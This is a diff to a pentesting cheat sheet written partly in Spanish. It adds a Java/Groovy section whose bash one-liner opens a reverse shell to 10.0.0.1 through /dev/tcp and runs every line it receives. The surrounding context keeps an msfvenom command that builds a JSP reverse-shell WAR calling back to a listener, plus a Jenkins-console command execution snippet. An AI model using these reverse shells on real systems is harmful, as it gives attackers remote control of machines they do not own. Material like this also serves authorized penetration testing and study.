@@ -28,9 +28,10 @@
     - [Netcat](#Netcat)   
     - [Python](#Python)
     - [PHP](#PHP)
+    - [Java](#Java)
     - [Perl](#Perl)
     - [War msfvenom (tomcat manager)](#War)
-    - [Groovy (Jenkins console)](#Groovy-(Jenkins-Console)
+    - [Groovy (Jenkins console)](#Groovy-(Jenkins-Console))
   - [Spawneando una shell mejor](#Spawning-a-TTY-shell)   
   - [Privilege Escalation](#Privilege-Escalation) 
   - [Escapando de Docker](#Escapando-de-Docker)
@@ -94,6 +95,18 @@ Técnicas para utilizar en sistemas basados en unix
 #### War
   ```bash
   msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f war > shell.war
+  ```
+#### Java
+  ```bash
+  r = Runtime.getRuntime()
+  p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+  p.waitFor()
+  ```
+#### Groovy (Jenkins Console)
+
+  ```bash
+  cmd = """ whoami """
+  println cmd.execute().text
   ```
 #### Perl
   ```bash
